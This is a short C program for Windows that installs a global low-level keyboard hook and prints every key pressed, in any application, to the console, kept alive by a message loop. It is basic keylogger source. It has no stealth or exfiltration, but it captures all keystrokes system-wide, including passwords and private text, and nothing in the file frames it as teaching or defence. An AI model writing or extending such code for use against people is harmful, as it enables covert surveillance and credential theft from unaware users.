#include <windows.h>
#include <stdio.h>

HHOOK hKeyboardHook;

// Low-level KeyboardProc to process keyboard input
LRESULT CALLBACK mylog(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        printf("%c", pKeyboard->vkCode); // Print virtual key code
	
    }
    return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
}

// Message loop to keep the hook running
void MessageLoop() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

int main() {
    // Install the low-level keyboard hook (WH_KEYBOARD_LL)
    hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, mylog, NULL, 0);
    
    if (hKeyboardHook == NULL) {
        printf("Failed to install hook ...!\n");
        DWORD errorCode = GetLastError();
        printf("Error code: %lu\n", errorCode);
    } else {
        printf("Hook installed!\n");
        MessageLoop(); // Keep the hook running
    }

    return 0;
}

